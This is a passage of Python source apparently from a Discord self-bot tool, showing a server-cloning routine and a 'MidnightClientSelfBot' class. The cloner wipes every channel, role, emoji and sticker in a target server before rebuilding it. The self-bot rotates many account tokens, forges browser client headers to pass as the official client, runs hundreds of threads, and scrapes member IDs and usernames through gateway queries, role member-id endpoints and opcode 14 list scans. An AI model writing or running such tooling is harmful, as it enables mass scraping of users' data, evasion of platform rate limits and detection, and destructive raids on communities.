        self.finished_signal.emit(True, f"Successfully logged server '{guild_info.get('name')}'.",
                                  self.initiating_button)

    def perfect_clone(self):
        if not self.cloned_data:
            self.finished_signal.emit(False, "No server data loaded. Please log or load a server first.",
                                      self.initiating_button)
            return

        self.update_signal.emit(f"Starting Perfect Clone for server: {self.target_guild_id}")
        headers = self.get_headers()

        self.delete_existing_structure(self.target_guild_id, headers)
        if not self.running: return self.finished_signal.emit(False, "Cloning stopped.", self.initiating_button)

        role_id_map = self.create_roles(self.target_guild_id, headers)
        if not self.running: return self.finished_signal.emit(False, "Cloning stopped.", self.initiating_button)

        self.create_emojis(self.target_guild_id, headers)
        if not self.running: return self.finished_signal.emit(False, "Cloning stopped.", self.initiating_button)

        self.create_all_channels(self.target_guild_id, headers, role_id_map)

        self.finished_signal.emit(True, "Perfect Clone process completed!", self.initiating_button)

    def perfect_perfect_clone(self):
        if not self.cloned_data:
            self.finished_signal.emit(False, "No server data loaded. Please log or load a server first.",
                                      self.initiating_button)
            return

        self.update_signal.emit(f"Starting Perfect Perfect Clone for server: {self.target_guild_id}")
        headers = self.get_headers()

        self.update_guild_info(self.target_guild_id, headers)
        if not self.running: return self.finished_signal.emit(False, "Cloning stopped.", self.initiating_button)

        self.delete_existing_structure(self.target_guild_id, headers)
        if not self.running: return self.finished_signal.emit(False, "Cloning stopped.", self.initiating_button)

        role_id_map = self.create_roles(self.target_guild_id, headers)
        if not self.running: return self.finished_signal.emit(False, "Cloning stopped.", self.initiating_button)

        self.create_emojis(self.target_guild_id, headers)
        if not self.running: return self.finished_signal.emit(False, "Cloning stopped.", self.initiating_button)

        self.create_all_channels(self.target_guild_id, headers, role_id_map)

        self.finished_signal.emit(True, "Perfect Perfect Clone process completed!", self.initiating_button)

    def delete_existing_structure(self, guild_id, headers):
        self.update_signal.emit("Deleting existing channels...")
        channels = self.make_request("GET", f"https://discord.com/api/{self.api_version}/guilds/{guild_id}/channels",
                                     headers=headers)
        if channels and channels.status_code == 200:
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(self.delete_channel, ch['id'], headers) for ch in channels.json()]
                for future in as_completed(futures):
                    if not self.running: break
                    future.result()

        self.update_signal.emit("Deleting existing roles...")
        roles = self.make_request("GET", f"https://discord.com/api/{self.api_version}/guilds/{guild_id}/roles",
                                  headers=headers)
        if roles and roles.status_code == 200:
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(self.delete_role, guild_id, role['id'], headers) for role in roles.json() if
                           not role['managed'] and role['name'] != '@everyone']
                for future in as_completed(futures):
                    if not self.running: break
                    future.result()

        self.update_signal.emit("Deleting existing emojis...")
        emojis = self.make_request("GET", f"https://discord.com/api/{self.api_version}/guilds/{guild_id}/emojis",
                                   headers=headers)
        if emojis and emojis.status_code == 200:
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(self.delete_emoji, guild_id, emoji['id'], headers) for emoji in
                           emojis.json()]
                for future in as_completed(futures):
                    if not self.running: break
                    future.result()

        self.update_signal.emit("Deleting existing stickers...")
        stickers = self.make_request("GET", f"https://discord.com/api/{self.api_version}/guilds/{guild_id}/stickers",
                                     headers=headers)
        if stickers and stickers.status_code == 200:
            self.update_signal.emit("[ℹ️] Note: Sticker cloning is not supported. Existing stickers will be deleted.")
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(self.delete_sticker, guild_id, sticker['id'], headers) for sticker in
                           stickers.json()]
                for future in as_completed(futures):
                    if not self.running: break
                    future.result()

    def delete_channel(self, channel_id, headers):
        if not self.running: return
        self.make_request("DELETE", f"https://discord.com/api/{self.api_version}/channels/{channel_id}",
                          headers=headers)

    def delete_role(self, guild_id, role_id, headers):
        if not self.running: return
        self.make_request("DELETE", f"https://discord.com/api/{self.api_version}/guilds/{guild_id}/roles/{role_id}",
                          headers=headers)

    def delete_emoji(self, guild_id, emoji_id, headers):
        if not self.running: return
        self.make_request("DELETE", f"https://discord.com/api/{self.api_version}/guilds/{guild_id}/emojis/{emoji_id}",
                          headers=headers)

    def delete_sticker(self, guild_id, sticker_id, headers):
        if not self.running: return
        self.make_request("DELETE",
                          f"https://discord.com/api/{self.api_version}/guilds/{guild_id}/stickers/{sticker_id}",
                          headers=headers)

    def create_roles(self, guild_id, headers):
        self.update_signal.emit("Creating roles...")
        role_id_map = {}
        source_roles = sorted(self.cloned_data['roles'], key=lambda r: r['position'], reverse=True)
        for role in source_roles:
            if not self.running: break
            if role['name'] == '@everyone':
                role_id_map[role['id']] = guild_id
                continue
            payload = {"name": role['name'], "color": role['color'], "permissions": str(role['permissions']),
                       "mentionable": role['mentionable'], "hoist": role['hoist']}
            response = self.make_request("POST", f"https://discord.com/api/{self.api_version}/guilds/{guild_id}/roles",
                                         json=payload, headers=headers)
            if response and response.status_code == 200:
                new_role = response.json()
                role_id_map[role['id']] = new_role['id']
                self.update_signal.emit(f"[✅] Created role: {role['name']}")
            else:
                self.update_signal.emit(f"[❌] Failed to create role: {role['name']}")
        return role_id_map

    def create_emojis(self, guild_id, headers):
        self.update_signal.emit("Creating emojis...")
        source_emojis = self.cloned_data.get('emojis', [])
        for emoji in source_emojis:
            if not self.running: break
            try:
                img_response = requests.get(f"https://cdn.discordapp.com/emojis/{emoji['id']}", timeout=10)
                if img_response.status_code == 200:
                    img_b64 = base64.b64encode(img_response.content).decode('utf-8')
                    file_ext = "gif" if emoji.get('animated') else "png"
                    payload = {
                        "name": emoji['name'],
                        "image": f"data:image/{file_ext};base64,{img_b64}"
                    }
                    self.make_request("POST", f"https://discord.com/api/{self.api_version}/guilds/{guild_id}/emojis",
                                      json=payload, headers=headers)
                    self.update_signal.emit(f"[✅] Created emoji: {emoji['name']}")
                else:
                    self.update_signal.emit(f"[❌] Failed to download image for emoji: {emoji['name']}")
            except Exception as e:
                self.update_signal.emit(f"[❌] Error processing emoji {emoji['name']}: {e}")

    def create_all_channels(self, guild_id, headers, role_id_map):
        self.update_signal.emit("Creating categories and channels...")
        self.category_map = {}
        source_categories = [ch for ch in self.cloned_data['channels'] if ch.get('type') == 4]
        self.update_signal.emit(f"Found {len(source_categories)} categories to create.")
        for cat_data in source_categories:
            if not self.running: return
            self.create_category(guild_id, cat_data, headers, role_id_map)
        self.update_signal.emit("Creating text, voice, and other channels...")
        for channel_info in self.cloned_data['channels']:
            if not self.running: return
            if channel_info.get('type') == 4:
                new_cat_id = self.category_map.get(channel_info['id'])
                if not new_cat_id:
                    self.update_signal.emit(
                        f"[⚠️] Could not find new ID for source category '{channel_info['name']}'. Skipping its children.")
                    continue
                for child_channel_data in channel_info.get('children', []):
                    if not self.running: return
                    self.create_channel(guild_id, child_channel_data, headers, new_cat_id, role_id_map)
            else:
                self.create_channel(guild_id, channel_info, headers, None, role_id_map)
        self.update_signal.emit("Finished creating channels.")

    def create_category(self, guild_id, cat_data, headers, role_id_map):
        if not self.running: return
        overwrites = self.translate_overwrites(cat_data.get('permission_overwrites', []), role_id_map)
        payload = {"name": cat_data.get('name', 'unnamed-category'), "type": 4, "permission_overwrites": overwrites}
        if cat_data.get('position') is not None:
            payload['position'] = cat_data.get('position', 0)
        response = self.make_request("POST", f"https://discord.com/api/{self.api_version}/guilds/{guild_id}/channels",
                                     json=payload, headers=headers)
        if response and response.status_code == 201:
            new_cat = response.json()
            self.category_map[cat_data['id']] = new_cat['id']
            self.update_signal.emit(f"[✅] Created category: {cat_data['name']}")
        else:
            error_message = "Unknown error"
            if response is not None:
                try:
                    error_message = response.json().get('message', response.text)
                except ValueError:
                    error_message = f"Status {response.status_code}: {response.text}"
            self.update_signal.emit(f"[❌] Failed to create category '{cat_data['name']}': {error_message}")

    def create_channel(self, guild_id, channel_data, headers, parent_id, role_id_map):
        if not self.running: return
        overwrites = self.translate_overwrites(channel_data.get('permission_overwrites', []), role_id_map)
        original_type = channel_data.get('type')
        payload = {"name": channel_data.get('name', 'unnamed-channel'), "permission_overwrites": overwrites}

        if original_type in [0, 5]:
            payload['type'] = 0
            if channel_data.get('topic'): payload['topic'] = channel_data['topic']
            if channel_data.get('nsfw') is not None: payload['nsfw'] = channel_data['nsfw']
        elif original_type in [2, 13]:
            payload['type'] = 2
            if channel_data.get('bitrate'): payload['bitrate'] = channel_data['bitrate']
            if channel_data.get('user_limit') is not None:
                user_limit = int(channel_data['user_limit'])
                if user_limit > 99:
                    self.update_signal.emit(f"[ℹ️] Capping user limit for '{payload['name']}' from {user_limit} to 99.")
                    user_limit = 99
                if user_limit < 0: user_limit = 0
                payload['user_limit'] = user_limit
        elif original_type == 15:
            payload['type'] = 15
            self.update_signal.emit(f"[ℹ️] Creating basic forum '{payload['name']}' with permissions only.")
        else:
            self.update_signal.emit(
                f"[⚠️] Skipping unsupported channel type ({original_type}) for channel '{payload['name']}'.")
            return

        if parent_id: payload['parent_id'] = parent_id
        if channel_data.get('position') is not None: payload['position'] = channel_data['position']

        response = self.make_request("POST", f"https://discord.com/api/{self.api_version}/guilds/{guild_id}/channels",
                                     json=payload, headers=headers)
        if response and response.status_code == 201:
            self.update_signal.emit(f"[✅] Created channel: {payload['name']}")
        else:
            error_message = "Unknown error"
            if response is not None:
                try:
                    error_message = response.json().get('message', response.text)
                except ValueError:
                    error_message = f"Status {response.status_code}: {response.text}"
            self.update_signal.emit(f"[❌] Failed to create channel '{payload['name']}': {error_message}")

    def translate_overwrites(self, overwrites, role_id_map):
        translated = []
        if not overwrites: return translated
        for ow in overwrites:
            ow_id = ow.get('id')
            if ow_id in role_id_map:
                translated.append(
                    {"id": role_id_map[ow_id], "type": ow['type'], "allow": ow['allow'], "deny": ow['deny']})
        return translated

    def update_guild_info(self, guild_id, headers):
        self.update_signal.emit("Updating server name and icon...")
        guild_info = self.cloned_data.get('guild_info', {})
        if 'name' in guild_info:
            self.make_request("PATCH", f"https://discord.com/api/{self.api_version}/guilds/{guild_id}",
                              json={"name": guild_info['name']}, headers=headers)
        if guild_info.get('icon'):
            is_animated = guild_info['icon'].startswith('a_')
            icon_ext = 'gif' if is_animated else 'png'
            icon_url = f"https://cdn.discordapp.com/icons/{self.source_guild_id}/{guild_info['icon']}.{icon_ext}?size=1024"
            icon_response = requests.get(icon_url)
            if icon_response.status_code == 200:
                icon_data = base64.b64encode(icon_response.content).decode('utf-8')
                self.make_request("PATCH", f"https://discord.com/api/{self.api_version}/guilds/{guild_id}",
                                  json={"icon": f"data:image/{icon_ext};base64,{icon_data}"}, headers=headers)
                self.update_signal.emit("Server icon updated.")
            else:
                self.update_signal.emit("Failed to download source server icon.")

# ++ REPLACE THE EXISTING MidnightClientSelfBot CLASS WITH THIS ONE ++
class MidnightClientSelfBot(QThread):
    update_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int, str)
    members_fetched_signal = pyqtSignal(list)
    finished = pyqtSignal(QObject, QPushButton)

    def __init__(self, tokens: list, options: dict, initiating_button: QPushButton = None, is_bot_mode: bool = False):
        super().__init__()
        self.tokens = tokens
        self.options = options
        self.initiating_button = initiating_button
        self.running = False
        self.token_index = 0
        self.base_url = "https://discord.com/api/v9"
        self.is_bot_mode = is_bot_mode

        # Load options into self
        for key, value in options.items():
            setattr(self, key, value)




        if options.get('use_single_thread', False):
            self.max_threads = 1     # Single Thread Mode
        elif options.get('use_custom_threads', False):
            self.max_threads = options.get('custom_thread_count', 50) # <--- ADDED
        elif options.get('use_low_threads', False):
            self.max_threads = 12    # Potato Mode
        elif options.get('use_high_threads', False):
            self.max_threads = 500   # High Thread Count
        else:
            self.max_threads = 150   # Standard Default



        self.current_mode = options.get("current_mode", "idle")


        # 2. INITIALIZE SESSION SECOND (Now self.max_threads exists!)
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=self.max_threads, 
            pool_maxsize=self.max_threads
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

        # 3. Rest of the variables
        self.channel_cache = []
        self.role_cache = []
        self.webhook_cache = []
        self.invalidate_dead_tokens = options.get('invalidate_dead_tokens', True)
        self.dead_token_retry_delay = options.get('dead_token_retry_delay', 30)
        self.protected_role_id = None
        self.emoji_cache = {} 
        self.token_cooldowns = {}
        self.user_id = None
        self.gateway_thread = None

        # --- GATEWAY & SCRAPER VARIABLES ---
        self.ws = None
        self.last_sequence = None
        self.gateway_ready = threading.Event()
        self.guild_found_event = threading.Event() 
        self.scraped_members = {}
        self.target_guild_member_count = 0
        self.target_channel_id = None 
        self.member_chunks = [] 
        self.chunk_gathering_event = threading.Event() 
        
        self.super_properties = base64.b64encode(json.dumps({
            "os": "Windows",
            "browser": "Chrome",
            "device": "",
            "system_locale": "en-US",
            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "browser_version": "124.0.0.0",
            "os_version": "10",
            "referrer": "",
            "referring_domain": "",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": 289648,
            "client_event_source": None
        }, separators=(',', ':')).encode()).decode()

        self.headers_template = {
            "Authorization": None,
            "Accept": "*/*",
            "Accept-Language": "en-US",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/channels/@me",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "X-Super-Properties": self.super_properties
        }

        self.standard_emojis = [
            "😀", "😃", "😄", "😁", "😆", "😅", "😂", "🤣", "😊", "😇", "🙂", "🙃", "😉", "😌", "😍", 
            "🥰", "😘", "😗", "😙", "😚", "😋", "😛", "😝", "😜", "🤪", "🤨", "🧐", "🤓", "😎", "🤩", 
            "🥳", "😏", "😒", "😞", "😔", "😟", "😕", "🙁", "☹️", "😣", "😖", "😫", "😩", "🥺", "😢", 
            "😭", "😤", "😠", "😡", "🤬", "🤯", "😳", "🥵", "🥶", "😱", "😨", "😰", "😥", "😓", "🤗", 
            "🤔", "🤭", "🤫", "🤥", "😶", "😐", "😑", "😬", "🙄", "😯", "😦", "😧", "😮", "😲", "🥱", 
            "😴", "🤤", "😪", "😵", "🤐", "🥴", "🤢", "🤮", "🤧", "😷", "🤒", "🤕", "🤑", "🤠", "😈", 
            "👿", "👹", "👺", "🤡", "💩", "👻", "💀", "☠️", "👽", "👾", "🤖", "🎃", "😺", "😸", "😹", 
            "😻", "😼", "😽", "🙀", "😿", "😾", "👋", "🤚", "🖐", "✋", "🖖", "👌", "🤌", "🤏", "✌️", 
            "🤞", "🤟", "🤘", "🤙", "👈", "👉", "👆", "🖕", "👇", "☝️", "👍", "👎", "✊", "👊", "🤛", 
            "🤜", "👏", "🙌", "👐", "🤲", "🤝", "🙏", "✍️", "💅", "🤳", "💪", "🦾", "🦵", "🦿", "🦶", 
            "👣", "👀", "👁", "🧠", "🫀", "🫁", "🦷", "🦴", "👅", "👄", "💋", "💯", "🔥", "💥", "⭐", 
            "✨", "🌟", "💫", "⚡", "☄️", "☀️", "🌈", "❤️", "🧡", "💛", "💚", "💙", "💜", "🖤", "🤍", 
            "🤎", "💔", "💖", "💘", "💝", "💢", "💤", "💦", "💨", "🚀", "🛸", "🌍", "🌕", "🌑", "💎", 
            "🎁", "🎉", "🎊", "🎈", "🎂", "🎄", "🎅", "👼", "👑", "🥇", "🏆", "🎖️", "🎯", "🎱", "🎲", 
            "🎰", "🎮", "🕹️", "💻", "📱", "💡", "💰", "💸", "📈", "📉", "📌", "📍", "📎", "🔗", "🔑", 
            "🔒", "🔓", "🔔", "📣", "📢", "🔊", "🔇", "🎵", "🎶", "🎤", "🎧", "🎷", "🎸", "🎹", "🎻", 
            "🥁", "🎬", "🎭", "🎨", "🎪", "🎟️", "🎫", "✅", "❌", "☢️"
        ]
        
        self.last_ping_time = time.time()
        self.pings_sent_this_second = 0






    def _get_valid_text_channels(self, guild_id, token):
        """
        Returns a prioritized list of text channel IDs.
        Used by the chunk fetcher to find a channel where the member list is visible.
        """
        self.update_signal.emit("[🔍] Scanning for valid text channels...")
        
        # 1. Fetch Channels
        r_channels = self.make_request("GET", f"{self.base_url}/guilds/{guild_id}/channels", token)
        if not r_channels or r_channels.status_code != 200:
            self.update_signal.emit(f"[❌] Failed to fetch channel list (Status: {getattr(r_channels, 'status_code', 'N/A')})")
            return []

        all_channels = r_channels.json()
        
        # 2. Filter for Text (0) or News (5) channels
        candidates = [c for c in all_channels if c.get('type') in [0, 5]]
        
        # 3. Sort by position (Higher up in the server list usually means more public)
        candidates.sort(key=lambda x: x.get('position', 0))

        prioritized_ids = []
        low_priority_ids = []
        
        # 4. Prioritize based on name
        for ch in candidates:
            name = ch.get('name', '').lower()
            # Avoid channels that often hide members
            if any(x in name for x in ['verif', 'ticket', 'log', 'join', 'welcome']):
                low_priority_ids.append(ch['id'])
            else:
                # Prefer general chat, lounge, etc.
                prioritized_ids.append(ch['id'])
        
        # Combine: Good channels first -> Bad channels last
        final_list = prioritized_ids + low_priority_ids

        if not final_list:
             self.update_signal.emit("[⚠️] No specific text channels found. Trying ALL channels.")
             return [c['id'] for c in all_channels]

        self.update_signal.emit(f"[📊] Found {len(final_list)} candidates. Top: {final_list[0]}")
        return final_list



    def _process_member_list_update(self, data): 
        """Parses Opcode 14 events (SYNC, INSERT, UPDATE)."""
        ops = data.get('ops', [])
        
        # If the update is for the wrong channel or guild, ignore (optional safety)
        if data.get('guild_id') != str(getattr(self, 'server_id', '')):
            return

        for op in ops:
            op_type = op.get('op')
            
            # SYNC contains a full range of members (Initial load or large jump)
            # INSERT adds a member to the list
            if op_type in ['SYNC', 'INSERT']:
                items = op.get('items', [])
                for item in items:
                    # The member object is wrapped inside 'member'
                    member_data = item.get('member')
                    if member_data:
                        user = member_data.get('user')
                        if user:
                            uid = user.get('id')
                            # Only add if unique
                            if uid and uid not in self.scraped_members:
                                self.scraped_members[uid] = {
                                    "id": uid,
                                    "username": user.get('username', 'Unknown'),
                                    "discriminator": user.get('discriminator', '0'),
                                    "bot": user.get('bot', False)
                                }



    def _get_best_channel_and_log(self, guild_id, token):
        """
        Fetches all channels, filters for text/news, VERIFIES access via API, 
        logs them for the user, and returns the best candidate.
        """
        self.update_signal.emit("[🔍] Scanning for valid text channels...")
        
        # Fetch all channels in the guild
        r_channels = self.make_request("GET", f"{self.base_url}/guilds/{guild_id}/channels", token)
        if not r_channels or r_channels.status_code != 200:
            self.update_signal.emit(f"[❌] Failed to fetch channel list (Status: {getattr(r_channels, 'status_code', 'N/A')})")
            return None

        all_channels = r_channels.json()
        
        # Filter: Text (0) or News (5) only. Sort by position (Top of server first).
        candidates = [c for c in all_channels if c['type'] in [0, 5]]
        candidates.sort(key=lambda x: x.get('position', 0))

        if not candidates:
            self.update_signal.emit("[❌] No text channels found in this server.")
            return None

        self.update_signal.emit(f"[📊] Found {len(candidates)} text channels. Verifying access...")
        
        valid_channels = []
        
        # Check the top 5 channels to find a working one
        # We don't check all 50+ channels to avoid rate limits
        check_limit = 5 
        
        for i, ch in enumerate(candidates):
            if len(valid_channels) >= 3: break # Stop after finding 3 good ones
            if i > 15: break # Don't scan too deep
            
            # Verification Request: Can we get specific details for this channel?
            # If we get 403, we can't see it. If 200, we are good.
            r_check = requests.get(
                f"{self.base_url}/channels/{ch['id']}", 
                headers={"Authorization": token, "Content-Type": "application/json"}
            )
            
            if r_check.status_code == 200:
                valid_channels.append(ch)
                print(f"[CONSOLE] Valid Channel Found: {ch['name']} (ID: {ch['id']})")
            else:
                print(f"[CONSOLE] Skipped Hidden/Locked Channel: {ch['name']} ({r_check.status_code})")

        if not valid_channels:
            self.update_signal.emit("[❌] Could not verify access to any text channels. (All 403 Forbidden?)")
            return None

        # Log the best one
        best = valid_channels[0]
        self.update_signal.emit(f"[✅] Selected best channel: #{best['name']} (ID: {best['id']})")
        
        return best['id']



    def fetch_members_legacy(self, delay=1.5):
        """
        Fetches members using Opcode 8 (Querying letters/numbers) - The 'Old' Way.
        Delay increased to 1.5s to prevent missing members.
        """
        if not self.running: return []
        server_id = getattr(self, 'server_id', None)
        if not server_id: return []
        
        token = self.tokens[0]
        self.gateway_ready.clear()
        self.guild_found_event.clear()
        self.scraped_members = {} # We re-use this dict for consistency

        # Connect
        self.gateway_thread = threading.Thread(target=self.connect_gateway, args=(token, server_id), daemon=True)
        self.gateway_thread.start()
        
        self.update_signal.emit("[🔍] Legacy Mode: Connecting to Gateway...")
        if not self.gateway_ready.wait(timeout=20):
            self.update_signal.emit("[❌] Gateway Connection Timed Out.")
            self.stop()
            return []

        self.update_signal.emit(f"[🔍] Legacy Mode: Starting Query Scan (Delay: {delay}s)...")

        # Queries to run
        chars = "abcdefghijklmnopqrstuvwxyz0123456789_!."
        queries = list(chars)
        
        for i, query in enumerate(queries):
            if not self.running: break
            
            payload = {
                "op": 8,
                "d": {
                    "guild_id": server_id,
                    "query": query,
                    "limit": 0
                }
            }
            self.send_json_request(self.ws, payload)
            
            percent = int(((i+1) / len(queries)) * 100)
            self.progress_signal.emit(percent, f"Querying '{query}'...")
            
            # Wait longer to ensure Discord sends the packet back
            time.sleep(delay)

        # Small cooldown at the end to catch stragglers
        self.update_signal.emit("[⏳] Waiting for final packets...")
        time.sleep(2.0)

        if self.ws: self.ws.close()
        
        results = list(self.scraped_members.values())
        
        print(f"\n[CONSOLE] ====== LEGACY SCRAPED {len(results)} MEMBERS ======")
        for member in results:
            print(f"[CONSOLE] Found: {member.get('username')} ({member.get('id')})")
        print("[CONSOLE] ===============================================\n")

        self.update_signal.emit(f"[✅] Legacy Scrape complete. Captured {len(results)} unique members.")
        return results



    def get_next_token(self):
        """Gets the next available token, skipping any that are on cooldown."""
        if not self.tokens:
            return None
        while self.running:
            if len(self.token_cooldowns) == len(self.tokens):
                self.update_signal.emit("[⏳] All tokens are on cooldown. Waiting for the next one to become available...")
                soonest_expiry = min(self.token_cooldowns.values())
                sleep_duration = max(0, soonest_expiry - time.time())
                time.sleep(sleep_duration + 0.1)
            
            self.token_index = (self.token_index + 1) % len(self.tokens)
            token = self.tokens[self.token_index]
            cooldown_end_time = self.token_cooldowns.get(token)

            if cooldown_end_time is None:
                # Token is not on cooldown, it's ready to use
                return token
            elif time.time() >= cooldown_end_time:
                # Cooldown has expired, the token is ready to use again
                del self.token_cooldowns[token]
                self.update_signal.emit(f"[INFO] Token ...{token[-4:]} is off cooldown and active again.")
                return token
            else:
                # Token is still on cooldown, loop will continue to the next one
                continue
        
        return None # Will only be reached if self.running becomes False
    



    def _process_member_list_update(self, data):
        """Parses Opcode 14 events."""
        ops = data.get('ops', [])
        for op in ops:
            if op['op'] in ['SYNC', 'INSERT']:
                items = op.get('items', [])
                for item in items:
                    member = item.get('member')
                    if member:
                        user = member.get('user')
                        if user:
                            uid = user.get('id')
                            if uid and uid not in self.scraped_members:
                                self.scraped_members[uid] = {
                                    "id": uid,
                                    "username": user.get('username', 'Unknown'),
                                    "discriminator": user.get('discriminator', '0')
                                }



    def fetch_members_by_role(self):
        """
        FETCHES OFFLINE MEMBERS via Roles.
        SORTED: Scans lowest roles (Verified, Member, etc) FIRST.
        """
        if not self.running: return []
        server_id = getattr(self, 'server_id', None)
        token = self.tokens[0]
        
        self.update_signal.emit("[🔍] Fetching server roles...")
        
        r_roles = self.make_request("GET", f"{self.base_url}/guilds/{server_id}/roles", token)
        if not r_roles or r_roles.status_code != 200:
            self.update_signal.emit("[⚠️] Could not fetch roles. Skipping role scrape.")
            return []
            
        roles = r_roles.json()
        
        # --- KEY FIX: SORT BY POSITION (LOWEST FIRST) ---
        # Lower position = Role is lower in the list = Usually has MORE people.
        # Position 0 is usually @everyone (or the integration role).
        roles.sort(key=lambda x: x.get('position', 0))
        
        total_roles = len(roles)
        self.update_signal.emit(f"[📊] Found {total_roles} roles. Scanning bottom-up (Mass roles first)...")
        
        start_count = len(self.scraped_members)
        headers = {"Authorization": token, "Content-Type": "application/json"}

        for i, role in enumerate(roles):
            if not self.running: break
            
            role_id = role['id']
            endpoint = f"{self.base_url}/guilds/{server_id}/roles/{role_id}/member-ids"
            
            # Skip @everyone if it matches Guild ID (Discord blocks this endpoint for @everyone on huge servers)
            # We rely on the chunk scraper/legacy scraper to catch no-role users.
            if role_id == server_id:
                continue

            while self.running:
                try:
                    # --- KEY FIX: INCREASED TIMEOUT ---
                    # Large roles (10k+ IDs) take longer to download. 30s is safer.
                    r = requests.get(endpoint, headers=headers, timeout=30)
                    
                    if r.status_code == 200:
                        ids = r.json()
                        if isinstance(ids, list):
                            new = 0
                            for uid in ids:
                                if uid not in self.scraped_members:
                                    self.scraped_members[uid] = {"id": uid, "username": "Unknown", "discriminator": "0"}
                                    new += 1
                            
                            # Always update log for large finds
                            if new > 0:
                                self.progress_signal.emit(int((i / total_roles) * 100), f"Role: {role['name']} (+{new})")
                            elif len(ids) > 0:
                                self.progress_signal.emit(int((i / total_roles) * 100), f"Role: {role['name']} (dup)")

                        break # Success, move to next role
                    
                    elif r.status_code == 429:
                        # Strict Rate Limit Handling
                        try:
                            retry = float(r.json().get('retry_after', 2.0))
                        except:
                            retry = 5.0
                        self.update_signal.emit(f"[⏳] Rate limited on '{role['name']}'. Sleeping {retry:.2f}s...")
                        time.sleep(retry + 0.5)
                        continue
                    
                    elif r.status_code == 403:
                        # Forbidden (Discord blocking access to this specific role list)
                        # self.update_signal.emit(f"[🔒] Cannot view members for role: {role['name']}")
                        break
                    else:
                        # Other error (404, 500)
                        break
                except Exception:
                    # Timeout or connection error
                    break
            
            # 1.5s delay is the sweet spot. Faster causes 429 chains.
            time.sleep(1.5) 

        found_this_phase = len(self.scraped_members) - start_count
        self.update_signal.emit(f"[✅] Role Scrape done. Found {found_this_phase} new members.")
        return list(self.scraped_members.values())




    def fetch_members_via_chunks(self, delay=0.2):
        """
        Smart Chunk Fetcher (Opcode 14).
        Auto-Detects server count to set an exact limit.
        """
        if not self.running: return []
        server_id = getattr(self, 'server_id', None)
        token = self.tokens[0]
        self.gateway_ready.clear()
        self.guild_found_event.clear()
        
        if not hasattr(self, 'scraped_members') or self.scraped_members is None:
            self.scraped_members = {}

        # --- 1. DETERMINE TARGET COUNT (THE FIX) ---
        manual_limit = self.options.get('custom_member_limit', 0)
        
        if manual_limit > 0:
            self.target_guild_member_count = manual_limit
            self.update_signal.emit(f"[🎯] Using Manual Goal: {manual_limit} members")
        else:
            self.update_signal.emit("[🔍] Auto-Detect: Fetching true server member count...")
            
            try:
                # We must use 'with_counts=true' to get the real approximate count
                r_info = self.session.get(
                    f"{self.base_url}/guilds/{server_id}",
                    headers={"Authorization": token, "Content-Type": "application/json"},
                    params={"with_counts": "true"}, 
                    timeout=10
                )

                if r_info.status_code == 200:
                     data = r_info.json()
                     # Try approximate first (most accurate), then standard member_count
                     count = data.get('approximate_member_count', data.get('member_count', 0))
                     
                     self.target_guild_member_count = int(count)
                     self.update_signal.emit(f"[✅] Server Count Detected: {self.target_guild_member_count}")
                else:
                     # Fallback if API fails (e.g. 403 Forbidden)
                     self.target_guild_member_count = 10000
                     self.update_signal.emit(f"[⚠️] Could not fetch count (Status {r_info.status_code}). Defaulting to 10,000.")
            except Exception as e:
                self.target_guild_member_count = 10000
                self.update_signal.emit(f"[⚠️] Error fetching count: {e}. Defaulting to 10,000.")

        # --- 2. CONNECT GATEWAY ---
        self.gateway_thread = threading.Thread(target=self.connect_gateway, args=(token, server_id), daemon=True)
        self.gateway_thread.start()
        self.update_signal.emit("[🔍] Connecting to Gateway...")
        self.gateway_ready.wait(timeout=15)

        if not self.gateway_ready.is_set():
            self.update_signal.emit("[❌] Gateway failed to connect.")
            return []

        # --- 3. FIND CHANNELS ---
        candidates = self._get_valid_text_channels(server_id, token)
        if not candidates:
            self.update_signal.emit("[❌] No text channels found to bind Opcode 14.")
            self.stop()
            return []

        total_target = self.target_guild_member_count
        scan_limit = total_target + 500 # Safety buffer
        
        self.update_signal.emit(f"[📊] Target: {total_target} members. Scanning via {len(candidates)} channels.")

        # --- 4. SCAN LOOP ---
        for channel_index, channel_id in enumerate(candidates):
            if not self.running: break
            
            if len(self.scraped_members) >= total_target:
                self.update_signal.emit(f"[✅] Goal Reached ({len(self.scraped_members)}). Stopping scan.")
                break

            self.target_channel_id = channel_id
            self.update_signal.emit(f"[🔄] Binding to Channel {channel_index+1}/{len(candidates)} (ID: {channel_id})...")

            payload = {
                "op": 14,
                "d": {
                    "guild_id": str(server_id),
                    "typing": True, "threads": True, "activities": True,
                    "members": [],
                    "channels": { str(self.target_channel_id): [[0, 99]] }
                }
            }

            self.chunk_gathering_event.clear()
            self.send_json_request(self.ws, payload)
            
            if not self.chunk_gathering_event.wait(timeout=3.0):
                 self.update_signal.emit(f"[⚠️] No response from Channel {channel_id}. Swapping...")
                 continue

            range_step = 100
            consecutive_no_data = 0
            last_member_count = len(self.scraped_members)

            for i in range(0, scan_limit, range_step): 
                if not self.running: break
                
                # Stop if we pass the server count (prevents infinite loops)
                if i > total_target: 
                    break 
                
                if len(self.scraped_members) >= total_target: 
                    break

                current_range = [[i, i + (range_step - 1)]]
                payload["d"]["channels"][str(self.target_channel_id)] = current_range
                
                self.chunk_gathering_event.clear()
                self.send_json_request(self.ws, payload)
                self.chunk_gathering_event.wait(timeout=1.5)

                current_count = len(self.scraped_members)
                new_members = current_count - last_member_count
                
                percent = int((current_count / total_target) * 100) if total_target > 0 else 0
                self.progress_signal.emit(percent, f"Scanned: {current_count}/{total_target}")

                if new_members == 0:
                    consecutive_no_data += 1
                else:
                    consecutive_no_data = 0
                    last_member_count = current_count

                # If 3 requests return no new data, channel is exhausted
                if consecutive_no_data >= 3:
